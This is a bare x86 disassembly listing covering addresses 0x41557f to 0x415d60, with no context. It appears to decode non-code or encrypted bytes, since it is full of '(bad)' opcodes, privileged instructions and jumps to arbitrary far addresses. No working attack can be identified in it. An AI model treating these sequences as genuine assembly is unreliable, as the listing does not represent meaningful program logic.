  41557f:	fist   WORD PTR [ecx+0x74]
  415582:	repz pop esp
  415584:	xchg   edi,eax
  415585:	jge    0x41551c
  415587:	out    dx,al
  415588:	push   ebp
  415589:	mov    esp,0x190baf64
  41558e:	sti    
  41558f:	test   DWORD PTR ds:0x1a5d69b4,0x8661f1e
  415599:	sbb    eax,eax
  41559b:	sub    DWORD PTR [esi+0x426ab74c],ebp
  4155a1:	lahf   
  4155a2:	mov    ebx,0x4acffaa5
  4155a7:	mov    ?,WORD PTR [ebx]
  4155a9:	pop    eax
  4155aa:	mov    cl,0x7e
  4155ac:	js     0x415570
  4155ae:	fwait
  4155af:	ret    0x7719
  4155b2:	mov    WORD PTR [ebx-0x73],fs
  4155b5:	cwde   
  4155b6:	and    al,0x13
  4155b8:	xor    DWORD PTR [edi-0x15],esi
  4155bb:	cmp    ecx,DWORD PTR [eax]
  4155bd:	pop    ebx
  4155be:	gs jecxz 0x415613
  4155c1:	imul   ebp,DWORD PTR [edi+0x49678828],0x1e2dfe83
  4155cb:	(bad)  
  4155cc:	out    0xfa,eax
  4155ce:	mov    dl,0x2f
  4155d0:	mov    ebp,0x70e5b09f
  4155d5:	lods   eax,DWORD PTR ds:[esi]
  4155d6:	into   
  4155d7:	test   DWORD PTR [ebp+0x26],ecx
  4155da:	dec    edx
  4155db:	mov    al,BYTE PTR [ebp-0x1fe64633]
  4155e1:	hlt    
  4155e2:	cmp    edi,DWORD PTR [ecx+edi*2]
  4155e5:	aas    
  4155e6:	xor    al,0x61
  4155e8:	or     DWORD PTR [eax+0x5194110a],eax
  4155ee:	fisttp DWORD PTR [edi-0x216ab678]
  4155f4:	pop    edi
  4155f5:	repz (bad) 
  4155f7:	mov    al,cs:0x536be919
  4155fd:	cmp    DWORD PTR [ebp-0x1d],esi
  415600:	mov    ch,0x49
  415602:	ins    BYTE PTR es:[edi],dx
  415603:	loop   0x41560a
  415605:	div    BYTE PTR [edi]
  415607:	addr16 nop
  415609:	mul    BYTE PTR [ebp+0x3b6e5feb]
  41560f:	push   esi
  415610:	data16 and dh,BYTE PTR [ebx-0x337bd6f8]
  415617:	aad    0xa5
  415619:	cmp    BYTE PTR [edi],0xe2
  41561c:	sub    DWORD PTR [eax+0x39e28d31],edx
  415622:	aam    0x23
  415624:	arpl   WORD PTR [eax+0x78],bp
  415627:	pop    esp
  415628:	pop    eax
  415629:	loope  0x41566d
  41562b:	mov    edi,0x35356a72
  415630:	repz cmp bh,BYTE PTR [esp+ebx*4]
  415634:	xor    al,0xca
  415636:	imul   edx,DWORD PTR [ecx+0x47],0x1d
  41563a:	add    BYTE PTR [ebx+0x49559306],dl
  415640:	call   0x1d66:0x5288c416
  415647:	iret   
  415648:	add    bh,BYTE PTR [ebp-0x58]
  41564b:	mov    eax,0x284384d4
  415650:	ret    
  415651:	cli    
  415652:	mov    ebx,0x6334f26c
  415657:	mov    eax,0x60d3623c
  41565c:	dec    ebp
  41565d:	(bad)  
  41565e:	fsubr  st(3),st
  415660:	sub    esp,DWORD PTR [ecx-0x5b6a73fb]
  415666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415667:	add    dl,BYTE PTR [ebx]
  415669:	inc    ecx
  41566a:	mov    al,0xe6
  41566c:	and    ebx,DWORD PTR [edi-0xf0f4045]
  415672:	inc    edi
  415673:	lahf   
  415674:	pop    esp
  415675:	push   cs
  415676:	aam    0x9b
  415678:	xor    al,0xd9
  41567a:	in     eax,dx
  41567b:	lds    edx,FWORD PTR [edi+0x66b1eac1]
  415681:	leave  
  415682:	pop    edi
  415683:	xchg   esi,eax
  415684:	mov    eax,ds:0x423a3cc9
  415689:	lods   al,BYTE PTR ds:[esi]
  41568a:	cs cdq 
  41568c:	leave  
  41568d:	inc    BYTE PTR [esi-0x56]
  415690:	push   ebx
  415691:	mov    ebx,0x81631a57
  415696:	or     eax,DWORD PTR [ebp+0x3108241e]
  41569c:	cmp    BYTE PTR [ecx+0x2dd4659b],ah
  4156a2:	shl    BYTE PTR [edx+eiz*8+0x7eeabd2c],0x35
  4156aa:	lock call 0x2a65ed90
  4156b0:	mov    bl,0x1c
  4156b2:	fwait
  4156b3:	xor    ch,bl
  4156b5:	xor    al,0x9d
  4156b7:	pop    es
  4156b8:	xor    DWORD PTR [edx-0x515e2941],esi
  4156be:	mov    ebp,0x786a56d6
  4156c3:	mov    cl,0x6d
  4156c5:	shr    DWORD PTR [eax],1
  4156c7:	int3   
  4156c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156c9:	fisubr DWORD PTR [ebx-0x7bea41de]
  4156cf:	and    edx,DWORD PTR [esi]
  4156d1:	push   ss
  4156d2:	and    eax,0x2708dd05
  4156d7:	push   0xffffffb1
  4156d9:	push   esi
  4156da:	sar    BYTE PTR [ecx],0xb8
  4156dd:	jne    0x4156a9
  4156df:	(bad)  
  4156e2:	aas    
  4156e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156e4:	xor    DWORD PTR [edx-0xae043f8],0x5865a923
  4156ee:	stos   BYTE PTR es:[edi],al
  4156ef:	push   ecx
  4156f0:	mov    bl,0x64
  4156f2:	push   ebp
  4156f3:	je     0x15f09072
  4156f9:	in     al,0x75
  4156fb:	xchg   ecx,eax
  4156fc:	pushf  
  4156fd:	jne    0x41577d
  4156ff:	inc    ecx
  415700:	sub    DWORD PTR [ebp+0x9],edi
  415703:	cmc    
  415704:	pusha  
  415705:	cli    
  415706:	mov    edx,0x7c18de9e
  41570b:	sbb    BYTE PTR [edx],al
  41570d:	retf   0x4976
  415710:	ror    DWORD PTR [ecx+0x136daaf4],1
  415716:	test   DWORD PTR [esi-0x41],0x699c25be
  41571d:	xchg   ebp,eax
  41571e:	loopne 0x4156db
  415720:	gs xchg ecx,eax
  415722:	fst    QWORD PTR [esi]
  415724:	in     eax,0xa7
  415726:	gs push 0x53
  415729:	sub    DWORD PTR [esi-0x69],edx
  41572c:	xor    eax,0x471edb84
  415731:	xor    al,0xc3
  415733:	xlat   BYTE PTR ds:[ebx]
  415734:	dec    edi
  415735:	lods   eax,DWORD PTR es:[esi]
  415737:	jge    0x41575a
  415739:	xor    cl,BYTE PTR [edi]
  41573b:	movd   DWORD PTR [ecx-0x734fb194],mm0
  415742:	cdq    
  415743:	cmp    dl,al
  415745:	cmp    cl,al
  415747:	mov    ch,0x37
  415749:	pop    ds
  41574a:	pop    edx
  41574b:	cdq    
  41574c:	iret   
  41574d:	cmc    
  41574e:	sbb    BYTE PTR [ebp+0x486837ed],al
  415754:	aam    0x25
  415756:	btc    DWORD PTR [ebx],eax
  415759:	iret   
  41575a:	inc    esp
  41575b:	fnstenv [ebp-0x1499ce7d]
  415761:	mov    bl,0x3b
  415763:	das    
  415764:	jl     0x415735
  415766:	pmullw mm0,mm2
  415769:	into   
  41576a:	(bad)  
  41576b:	mov    esi,0xc1c56fe8
  415770:	cmp    DWORD PTR ds:0x65b0604e,esi
  415776:	dec    esp
  415777:	scas   al,BYTE PTR es:[edi]
  415778:	jp     0x41570d
  41577a:	call   0x94a0bb47
  41577f:	dec    esp
  415780:	xor    BYTE PTR [ecx],ch
  415782:	add    ecx,0xffffffa7
  415785:	cmp    ebp,DWORD PTR [edi-0x7d5e5ba4]
  41578b:	call   0x6010:0xeea2062e
  415792:	inc    ebp
  415793:	out    dx,eax
  415794:	adc    al,0xd9
  415796:	sbb    al,0x92
  415798:	frstor [ecx+ebx*4+0xfa5b599]
  41579f:	push   eax
  4157a0:	or     edi,DWORD PTR [ecx]
  4157a2:	hlt    
  4157a3:	enter  0x4c0b,0x2b
  4157a7:	jmp    0x64dd:0x625db254
  4157ae:	mov    cs,WORD PTR [ebx+0x52]
  4157b1:	push   ss
  4157b2:	ficom  WORD PTR [ebx-0x6b]
  4157b5:	pop    ebp
  4157b6:	or     DWORD PTR ds:0x36d19fe2,0x150e08be
  4157c0:	fcom   QWORD PTR [edx+0x323a145c]
  4157c6:	push   ebx
  4157c7:	ror    DWORD PTR [ebx+edi*4-0x42],1
  4157cb:	sub    cl,BYTE PTR [ebp+0x3c161901]
  4157d1:	jl     0x41583b
  4157d3:	scas   al,BYTE PTR es:[edi]
  4157d4:	sti    
  4157d5:	mov    ds:0x98a9859f,al
  4157da:	pop    es
  4157db:	add    al,0x77
  4157dd:	aaa    
  4157de:	inc    ebp
  4157df:	cdq    
  4157e0:	jns    0x415828
  4157e2:	sbb    BYTE PTR [edi-0x385f1594],0x7b
  4157e9:	enter  0xb5a8,0x2b
  4157ed:	dec    esi
  4157ee:	shl    BYTE PTR [esi+0xc],1
  4157f1:	inc    ebx
  4157f2:	jecxz  0x4157ed
  4157f4:	jb     0x4157d7
  4157f6:	inc    edx
  4157f7:	push   edi
  4157f8:	test   eax,0x4f231f2b
  4157fd:	xchg   edi,eax
  4157fe:	push   0x95912eef
  415803:	mov    WORD PTR [eax],?
  415805:	popf   
  415806:	adc    dl,ah
  415808:	jno    0x415803
  41580a:	sar    DWORD PTR [ecx-0x4bd6304],1
  415810:	icebp  
  415811:	sbb    al,0x8f
  415813:	push   es
  415814:	loop   0x4157dd
  415816:	adc    DWORD PTR [eax-0x2],ebp
  415819:	push   cs
  41581a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41581b:	ret    
  41581c:	xchg   BYTE PTR [esi],al
  41581e:	jo     0x41583f
  415820:	pop    ecx
  415821:	jmp    0x6711:0x81e62c35
  415828:	stc    
  415829:	dec    eax
  41582a:	jg     0x415829
  41582c:	out    0x94,al
  41582e:	and    edi,ebp
  415830:	repz sbb eax,0xf9a6cffc
  415836:	adc    ebp,0x423ae1a2
  41583c:	dec    edx
  41583d:	test   BYTE PTR [ebx+0x12],cl
  415840:	lods   al,BYTE PTR ds:[esi]
  415841:	or     ch,BYTE PTR [ebx]
  415843:	(bad)
  415847:	mov    WORD PTR [esi],ds
  415849:	fild   DWORD PTR [esi+esi*8]
  41584c:	xchg   ecx,eax
  41584d:	nop
  41584e:	mov    esi,0xcb584258
  415853:	in     al,0xec
  415855:	xlat   BYTE PTR ds:[ebx]
  415856:	mov    ch,0x97
  415858:	and    ah,BYTE PTR [ecx]
  41585a:	jo     0x41581f
  41585c:	add    DWORD PTR [eax],esi
  41585e:	mov    edi,0xec5d5e8
  415863:	add    bh,ah
  415865:	(bad)  
  415866:	pop    esp
  415867:	mov    ebp,0xf7a9b898
  41586c:	sbb    DWORD PTR [esi+0x58],ebx
  41586f:	repz mov es,WORD PTR [ecx-0x3465429f]
  415876:	syscall 
  415878:	push   ds
  415879:	push   esp
  41587a:	das    
  41587b:	lods   al,BYTE PTR ds:[esi]
  41587c:	mov    ecx,0xf09d7c13
  415881:	hlt    
  415882:	ds enter 0x8bc7,0xfc
  415887:	rol    BYTE PTR [esp+ebp*1+0x41],cl
  41588b:	ret    0x4bd
  41588e:	scas   al,BYTE PTR es:[edi]
  41588f:	xor    edi,DWORD PTR [esi-0x4a5b364c]
  415895:	dec    ebp
  415896:	test   edx,0x1dd22818
  41589c:	sbb    BYTE PTR [edi+ebx*2],al
  41589f:	enter  0x9c1,0xd0
  4158a3:	push   esi
  4158a4:	imul   edi,DWORD PTR [ebx],0xffffffcc
  4158a7:	mov    ah,0x70
  4158a9:	outs   dx,DWORD PTR ds:[esi]
  4158aa:	es jo  0x415846
  4158ad:	test   dl,dl
  4158af:	dec    eax
  4158b0:	and    al,0x3a
  4158b2:	in     eax,0x18
  4158b4:	and    al,dh
  4158b6:	xchg   BYTE PTR [eax],dl
  4158b8:	inc    ebp
  4158b9:	xlat   BYTE PTR ds:[ebx]
  4158ba:	sbb    eax,0xd9675a67
  4158bf:	xlat   BYTE PTR ds:[ebx]
  4158c0:	mov    bh,0x6b
  4158c2:	lds    esi,FWORD PTR [edi+0x1c]
  4158c5:	mov    esp,0x61efa6e5
  4158ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158cb:	dec    eax
  4158cc:	out    0x3a,al
  4158ce:	out    dx,eax
  4158cf:	aas    
  4158d0:	neg    DWORD PTR [edi+eiz*4+0x3a]
  4158d4:	sub    bh,dl
  4158d6:	push   ss
  4158d7:	(bad)  
  4158d8:	out    0x1,al
  4158da:	leave  
  4158db:	out    dx,al
  4158dc:	fnstenv [ebp+0x73]
  4158df:	gs pop esp
  4158e1:	xor    DWORD PTR [eax+0x5b],esi
  4158e4:	retf   0x525b
  4158e7:	push   edx
  4158e8:	mov    eax,ds:0x231cd214
  4158ed:	adc    BYTE PTR [esi],0x8e
  4158f0:	xchg   ebp,eax
  4158f1:	pop    es
  4158f2:	aad    0x58
  4158f4:	xchg   edi,eax
  4158f6:	push   edx
  4158f7:	mov    bl,0x0
  4158f9:	sbb    eax,0x4eb409d2
  4158fe:	xchg   edx,eax
  4158ff:	ins    BYTE PTR es:[edi],dx
  415900:	mov    eax,0xb3cfe37c
  415905:	aas    
  415906:	(bad)  ds:0xdaceee80
  41590c:	lods   al,BYTE PTR ds:[esi]
  41590d:	mov    eax,ds:0x5b371a09
  415912:	cmp    cl,BYTE PTR [eax]
  415914:	cmp    al,0xd
  415916:	sub    ebp,ebp
  415918:	data16 sbb ch,BYTE PTR ds:0xdeed8393
  41591f:	xchg   DWORD PTR [ecx+0x390e7319],esi
  415925:	jp     0x415987
  415927:	mov    ds:0x2f685771,al
  41592c:	pop    edi
  41592d:	push   edi
  41592e:	adc    al,BYTE PTR [ebp-0x52af7a13]
  415934:	retf   0x3e36
  415937:	mov    eax,ds:0x1f52b171
  41593c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593d:	lahf   
  41593e:	push   ebp
  41593f:	jbe    0x41599d
  415941:	xchg   ecx,eax
  415942:	xor    al,0xa1
  415944:	or     edx,esp
  415946:	shl    BYTE PTR ds:0x7948cab2,0x44
  41594d:	sub    al,0x9a
  41594f:	retf   0xbee5
  415952:	arpl   WORD PTR [edx-0x3e],ax
  415955:	dec    ecx
  415956:	push   ds
  415957:	arpl   si,di
  415959:	xor    eax,0xcb0a377c
  41595e:	mov    al,0xff
  415960:	inc    esp
  415961:	lods   al,BYTE PTR ds:[esi]
  415962:	add    DWORD PTR [eax+eax*8+0x72202850],eax
  415969:	inc    edx
  41596a:	mov    cl,0xe
  41596c:	push   ss
  41596d:	mov    DWORD PTR [edx+ebp*1+0x4c],esp
  415971:	retf   
  415972:	cmp    ebx,edx
  415974:	pop    ss
  415975:	js     0x415938
  415977:	(bad)  
  415978:	(bad)  
  415979:	out    dx,al
  41597a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41597b:	cmp    dh,dl
  41597d:	xlat   BYTE PTR ds:[ebx]
  41597e:	ret    0xa4a7
  415981:	inc    eax
  415982:	imul   edi,DWORD PTR [eax-0x26],0x7f
  415986:	(bad)  
  415987:	(bad)  
  415988:	jns    0x4159da
  41598a:	and    ecx,esp
  41598c:	inc    ecx
  41598d:	add    eax,0x12caca1c
  415992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415993:	adc    eax,ebx
  415995:	ret    0x7d93
  415998:	in     eax,0xd5
  41599a:	(bad)  [ecx-0x2e]
  41599d:	fcomp  QWORD PTR [ebp+0x37]
  4159a0:	lods   eax,DWORD PTR ds:[esi]
  4159a1:	push   ecx
  4159a2:	loope  0x415959
  4159a4:	and    eax,0x301e1d5c
  4159a9:	loopne 0x41594e
  4159ab:	push   edx
  4159ac:	jae    0x415967
  4159ae:	clc    
  4159af:	sub    esp,DWORD PTR [ebx+edx*2-0x46]
  4159b3:	cmp    al,0xc2
  4159b5:	jmp    0x6774:0xfe584a53
  4159bc:	mov    BYTE PTR [ebx-0xa],bh
  4159bf:	cmp    eax,0xf28cc711
  4159c4:	lock push ds
  4159c6:	xor    ecx,esp
  4159c8:	dec    edi
  4159c9:	mov    WORD PTR [edi+0x7a],?
  4159cc:	jns    0x4159ce
  4159ce:	push   0x5cba1a4c
  4159d3:	adc    BYTE PTR [esi-0x1f],dl
  4159d6:	fiadd  DWORD PTR [edi+edx*2+0x44a210e7]
  4159dd:	sub    eax,0x507cbd98
  4159e2:	or     esi,DWORD PTR [esp+ecx*4]
  4159e5:	jmp    0x4159c4
  4159e7:	imul   edx,DWORD PTR [edi],0x24
  4159ea:	add    al,0x32
  4159ec:	pop    ds
  4159ed:	cdq    
  4159ee:	aad    0x7b
  4159f0:	gs gs inc ebx
  4159f3:	test   eax,0xdd2b5842
  4159f8:	rcr    DWORD PTR [edx+0x4111acb],0xed
  4159ff:	aaa    
  415a00:	xlat   BYTE PTR ds:[ebx]
  415a01:	mov    dh,0xaa
  415a03:	popf   
  415a04:	jns    0x415a48
  415a06:	xor    DWORD PTR [esi+eiz*1+0x3a],ecx
  415a0a:	stc    
  415a0b:	or     BYTE PTR [ecx+0x8],al
  415a0e:	std    
  415a0f:	sbb    al,0xa
  415a11:	lock mov WORD PTR [esi],es
  415a14:	mov    WORD PTR ds:0x512d13fa,es
  415a1a:	retf   0x1be1
  415a1d:	xchg   ecx,eax
  415a1e:	adc    esp,ebp
  415a20:	or     DWORD PTR [edx-0x54],edi
  415a23:	not    DWORD PTR [ecx+0x4fd5924c]
  415a29:	pop    ebx
  415a2a:	sub    ch,bl
  415a2c:	out    0xa9,al
  415a2e:	rol    BYTE PTR ds:0xe5a6a5c7,1
  415a34:	cmp    ax,0xa4da
  415a38:	adc    dl,BYTE PTR [ecx-0x7]
  415a3b:	mov    al,ds:0xb108cee1
  415a40:	push   edx
  415a41:	ret    0xa19f
  415a44:	sbb    DWORD PTR [ecx-0x8],0x5a
  415a48:	imul   esi,DWORD PTR [ecx],0x7d
  415a4b:	rcl    cl,cl
  415a4d:	les    eax,FWORD PTR [eax+0x62]
  415a50:	jnp    0x415a5d
  415a52:	retf   0x5bf2
  415a55:	(bad)  
  415a56:	pop    edi
  415a57:	push   ebp
  415a58:	mov    cl,0xc6
  415a5a:	push   ebx
  415a5b:	aam    0x91
  415a5d:	sub    DWORD PTR [edi],esi
  415a5f:	push   es
  415a60:	in     eax,0x44
  415a62:	ror    BYTE PTR [esi],1
  415a64:	adc    eax,0x75c7d579
  415a69:	cli    
  415a6a:	xlat   BYTE PTR ds:[ebx]
  415a6b:	nop
  415a6c:	dec    esi
  415a6d:	or     bl,ch
  415a6f:	loop   0x415a0e
  415a71:	push   ds
  415a72:	popf   
  415a73:	imul   ebx,DWORD PTR [ebx+0x6],0xffffffd2
  415a77:	cmp    eax,0xcdb18624
  415a7c:	mov    esi,0x330b2c17
  415a81:	enter  0x77a3,0x5d
  415a85:	aas    
  415a86:	dec    esp
  415a87:	push   ebx
  415a88:	lods   al,BYTE PTR ds:[esi]
  415a89:	mov    edi,0xae8d81b3
  415a8e:	push   0x45
  415a90:	fldcw  WORD PTR [eax]
  415a92:	sar    esp,1
  415a94:	lds    edx,FWORD PTR [eax+0x78]
  415a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a98:	sbb    al,0xdc
  415a9a:	mov    ds:0x1abda1d,eax
  415a9f:	push   eax
  415aa0:	add    al,0x19
  415aa2:	mov    esp,0xa3d217af
  415aa7:	pop    ebx
  415aa8:	sub    eax,0x4c2a3a88
  415aad:	mov    ch,0xcf
  415aaf:	data16 and bh,dl
  415ab2:	pop    edx
  415ab3:	cli    
  415ab4:	in     eax,dx
  415ab5:	dec    esi
  415ab6:	test   al,0x3c
  415ab8:	jge    0x415aa9
  415aba:	mov    bh,0x7d
  415abc:	lea    ebp,[edx]
  415abe:	dec    eax
  415abf:	in     eax,dx
  415ac0:	mov    DWORD PTR [ecx+0x30],ebp
  415ac3:	shr    DWORD PTR [di],0xad
  415ac7:	pop    esp
  415ac8:	push   edx
  415ac9:	pusha  
  415aca:	jle    0x415ab6
  415acc:	into   
  415acd:	loop   0x415a8b
  415acf:	cmovb  edx,DWORD PTR [ebx]
  415ad2:	lahf   
  415ad3:	rol    bh,cl
  415ad5:	sub    al,0x94
  415ad7:	jp     0x415afd
  415ad9:	int    0xfa
  415adb:	(bad)  
  415adc:	cmp    DWORD PTR [eax+0x3b23d383],edx
  415ae2:	fist   DWORD PTR [ebx]
  415ae4:	ret    0xfed7
  415ae7:	ret    
  415ae8:	nop
  415ae9:	mov    al,0x12
  415aeb:	or     ch,al
  415aed:	iret   
  415aee:	fcom   QWORD PTR [edi+0x69d73736]
  415af4:	or     DWORD PTR [edx-0x1d],0x6f06da9a
  415afb:	mov    ds:0x39494436,eax
  415b00:	jle    0x415b07
  415b02:	jno    0x415af3
  415b04:	sbb    DWORD PTR [edx+0x61],0xc
  415b08:	mov    eax,ds:0x2b5d8e24
  415b0d:	sbb    eax,0xd2a232ee
  415b12:	les    ecx,FWORD PTR [ebp+edx*2-0x4e]
  415b16:	jbe    0x415b09
  415b18:	js     0x415a9d
  415b1a:	ret    0x768e
  415b1d:	jne    0x415ac4
  415b1f:	jnp    0x415b5e
  415b21:	aad    0x4a
  415b23:	jmp    0xc36185dc
  415b28:	fiadd  DWORD PTR [ebp+0x293c359]
  415b2e:	fs loop 0x415b0f
  415b31:	(bad)  
  415b33:	retf   0x852b
  415b36:	mov    dl,0xaa
  415b38:	and    DWORD PTR ds:0xcfe2b119,edi
  415b3e:	mov    eax,ds:0x5fc2d4cb
  415b43:	pminsw mm1,QWORD PTR [ecx]
  415b46:	mov    ebp,0x20901f22
  415b4b:	neg    DWORD PTR [ebx]
  415b4d:	aam    0xaf
  415b4f:	lods   eax,DWORD PTR ds:[esi]
  415b50:	fwait
  415b51:	sbb    al,0xf6
  415b53:	xchg   ebx,eax
  415b54:	mov    edx,0xfe048b92
  415b59:	jl     0x415aef
  415b5b:	into   
  415b5c:	test   al,0x89
  415b5e:	sbb    al,0xe0
  415b60:	loopne 0x415aff
  415b62:	retf   
  415b63:	pusha  
  415b64:	push   edi
  415b65:	mov    eax,ds:0xbe527220
  415b6a:	mov    eax,0x76fc0b4d
  415b6f:	mov    ds:0xafdf5d9a,eax
  415b74:	pop    ebx
  415b75:	jb     0x415b57
  415b77:	inc    ecx
  415b78:	and    al,0xb1
  415b7a:	sbb    DWORD PTR [esi+esi*4+0x37],0xfe2ec589
  415b82:	push   ds
  415b83:	add    bl,dh
  415b85:	fimul  DWORD PTR [edi+edi*4]
  415b88:	pop    ss
  415b89:	sub    DWORD PTR [edx],ebx
  415b8b:	mov    esp,0xdbca5cd2
  415b90:	mov    edi,0x616d5d1b
  415b95:	sbb    DWORD PTR [ecx+0x1d80125],edx
  415b9b:	dec    ebp
  415b9c:	push   ecx
  415b9d:	cmp    BYTE PTR [eax+0x1c],0xfb
  415ba1:	ss in  eax,0x79
  415ba4:	jmp    0x6d9cfbae
  415ba9:	cwde   
  415baa:	push   eax
  415bab:	sti    
  415bac:	fistp  DWORD PTR ds:0x475aabeb
  415bb2:	mov    cl,BYTE PTR [ecx-0x6c]
  415bb5:	sub    ecx,DWORD PTR [eax-0x243861fb]
  415bbb:	adc    BYTE PTR [eax],ah
  415bbd:	or     dl,BYTE PTR [edi-0x71]
  415bc0:	aam    0x9d
  415bc2:	stc    
  415bc3:	push   cs
  415bc4:	iret   
  415bc5:	mov    esp,DWORD PTR [edi-0x20]
  415bc8:	mov    dl,BYTE PTR [ecx-0x3e]
  415bcb:	jg     0x415bd2
  415bcd:	push   edx
  415bce:	jns    0x415b71
  415bd0:	icebp  
  415bd1:	rol    esp,1
  415bd3:	shl    DWORD PTR [esi+0x10],1
  415bd6:	cmp    eax,0x68ac353c
  415bdb:	cmp    BYTE PTR [esi],bl
  415bdd:	int3   
  415bde:	jnp    0x415b6d
  415be0:	cli    
  415be1:	jmp    0x399e2212
  415be6:	sbb    al,cl
  415be8:	mov    es,WORD PTR [esp+eax*4]
  415beb:	dec    ecx
  415bec:	loope  0x415bf9
  415bee:	retf   
  415bef:	xchg   edi,eax
  415bf0:	xchg   esi,eax
  415bf1:	xor    eax,0xf6ddcf3
  415bf6:	pop    ebp
  415bf7:	and    DWORD PTR [ebp-0x6c],ecx
  415bfa:	ret    
  415bfb:	push   es
  415bfc:	xor    DWORD PTR [ebx+0x1a1e4944],ebp
  415c02:	pop    esp
  415c03:	cmp    DWORD PTR [ecx],ecx
  415c05:	loope  0x415bdf
  415c07:	xchg   edi,eax
  415c08:	mov    ebx,0xc1830367
  415c0d:	imul   DWORD PTR [eax+0x1]
  415c10:	jo     0x415bea
  415c12:	(bad)  
  415c13:	stos   DWORD PTR es:[edi],eax
  415c14:	lods   eax,DWORD PTR ds:[esi]
  415c15:	int3   
  415c16:	fiadd  DWORD PTR [edi-0x7c4b380a]
  415c1c:	mov    al,0xc7
  415c1e:	mov    ch,0x4a
  415c20:	push   edi
  415c21:	fwait
  415c22:	dec    esp
  415c23:	inc    edx
  415c24:	daa    
  415c25:	imul   bl
  415c27:	mov    al,ds:0xc990a135
  415c2c:	popf   
  415c2d:	retf   0x3522
  415c30:	mulps  xmm6,XMMWORD PTR [edi+0x35fd6c4d]
  415c37:	jae    0x415c24
  415c39:	pop    ebx
  415c3a:	dec    esp
  415c3b:	xor    ch,ch
  415c3d:	dec    ecx
  415c3e:	dec    ecx
  415c3f:	or     eax,0x29c102a3
  415c44:	in     eax,0x73
  415c46:	aam    0xe
  415c48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c49:	pop    esp
  415c4a:	in     al,dx
  415c4b:	xor    cl,0xab
  415c4e:	jbe    0x415cb2
  415c50:	sti    
  415c51:	xchg   edi,eax
  415c52:	inc    edx
  415c53:	xlat   BYTE PTR ds:[ebx]
  415c54:	pusha  
  415c55:	cdq    
  415c56:	out    0x54,eax
  415c58:	jae    0x415be6
  415c5a:	hlt    
  415c5b:	push   ds
  415c5c:	sbb    al,BYTE PTR [ecx-0x16d3507a]
  415c62:	dec    edx
  415c63:	sub    BYTE PTR [eax+ebx*4+0x45],0xf6
  415c68:	jge    0x415c4e
  415c6a:	push   esp
  415c6b:	(bad)  
  415c6c:	mov    ebx,0xd38afa91
  415c71:	jle    0x415c52
  415c73:	ret    0x7504
  415c76:	(bad)  
  415c77:	sub    al,0xf9
  415c79:	cmp    DWORD PTR [edi-0x5b],ebx
  415c7c:	or     ebp,edx
  415c7e:	and    dh,ah
  415c80:	sub    bl,ch
  415c82:	adc    ecx,eax
  415c84:	adc    cl,ah
  415c86:	mov    bh,0xa9
  415c88:	jle    0x415c18
  415c8a:	pop    ebx
  415c8b:	test   DWORD PTR [edi],esp
  415c8d:	push   es
  415c8e:	aas    
  415c8f:	stos   DWORD PTR es:[edi],eax
  415c90:	pop    ds
  415c91:	call   0x4667:0xd8ce9a54
  415c98:	inc    ecx
  415c99:	pop    ecx
  415c9a:	int3   
  415c9b:	push   ds
  415c9c:	imul   esp,DWORD PTR ds:0xbb5dba86,0x5d19e433
  415ca6:	xchg   esi,eax
  415ca7:	sahf   
  415ca8:	les    ecx,FWORD PTR [esp+eax*4]
  415cab:	mov    esi,ebp
  415cad:	int3   
  415cae:	pop    esi
  415caf:	mov    BYTE PTR [eax-0x42a83c42],cl
  415cb5:	inc    edi
  415cb6:	lds    ecx,FWORD PTR [ebp+ecx*4+0x4b]
  415cba:	and    eax,0xabea1b47
  415cbf:	jnp    0x415c8a
  415cc1:	retf   
  415cc2:	ins    DWORD PTR es:[edi],dx
  415cc3:	fstp   DWORD PTR [esi]
  415cc5:	xor    eax,0x51575534
  415cca:	add    BYTE PTR [edi+0x2d60ba7e],ch
  415cd0:	je     0x415cfa
  415cd2:	or     bh,BYTE PTR [ebx-0x1e]
  415cd5:	cmp    dl,BYTE PTR [esi+0x5e]
  415cd8:	xchg   ebp,eax
  415cd9:	inc    ebx
  415cda:	jmp    0xcf074d70
  415cdf:	popf   
  415ce0:	push   edx
  415ce1:	pop    ds
  415ce2:	mov    al,ds:0xa942ff0e
  415ce7:	outs   dx,DWORD PTR ds:[esi]
  415ce8:	mov    ah,0xe
  415cea:	imul   BYTE PTR [esi-0x57]
  415ced:	push   es
  415cee:	mov    bl,0x77
  415cf0:	fcom   DWORD PTR [esi+0x643c7422]
  415cf6:	pushw  es
  415cf8:	inc    esi
  415cf9:	in     al,dx
  415cfa:	xchg   edi,eax
  415cfb:	test   BYTE PTR [edx+0x7445e4ff],cl
  415d01:	mov    esi,0x3c8c3b6
  415d06:	ss jnp 0x415d0d
  415d09:	xor    BYTE PTR [ecx-0x60],al
  415d0c:	xchg   ebp,eax
  415d0d:	adc    BYTE PTR [eax],bl
  415d0f:	fsubr  DWORD PTR [esi+0x7d]
  415d12:	jg     0x415d82
  415d14:	out    0x7d,al
  415d16:	popa   
  415d17:	jle    0x415caa
  415d19:	mov    al,ds:0x4b8e1fd5
  415d1e:	mov    cl,0x9f
  415d20:	jno    0x415d0f
  415d22:	cmp    al,BYTE PTR [esi]
  415d24:	pop    esi
  415d25:	dec    ecx
  415d26:	mov    edx,0xaefc3c8e
  415d2b:	push   esi
  415d2c:	fisttp WORD PTR [edx]
  415d2e:	jmp    0x6310c159
  415d33:	jbe    0x415cc5
  415d35:	shl    esp,0xd5
  415d38:	inc    edx
  415d39:	(bad)  
  415d3a:	int3   
  415d3b:	push   ebx
  415d3c:	ficom  DWORD PTR [eax+edx*2-0x26c052b4]
  415d43:	xchg   esp,edi
  415d45:	loope  0x415d60
  415d47:	push   es
  415d48:	mov    bl,0xcb
  415d4a:	add    BYTE PTR [edi+0x39],ch
  415d4d:	(bad)  
  415d4e:	repnz retf 
  415d50:	push   0xf80a1c37
  415d55:	das    
  415d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d57:	xchg   ebx,eax
  415d58:	inc    esi
  415d59:	push   ebp
  415d5a:	dec    edx
  415d5b:	enter  0x4a36,0x14
  415d5f:	dec    esp
  415d60:	xchg   edx,eax
